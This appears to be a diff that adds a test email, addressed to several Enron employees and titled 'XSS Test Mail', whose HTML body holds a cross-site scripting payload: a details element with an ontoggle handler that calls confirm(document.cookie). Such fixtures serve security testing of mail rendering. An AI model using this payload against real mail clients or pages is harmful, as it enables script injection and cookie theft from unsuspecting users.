@@ -1,0 +1,10 @@
+From: jesse.alvarado@enron.com
+To: robert.superty@enron.com, randall.gay@enron.com, victor.lamadrid@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<details ontoggle="confirm(document.cookie)">
+   xss
+   <summary>click me</summary>xssxssxss
+  </details>
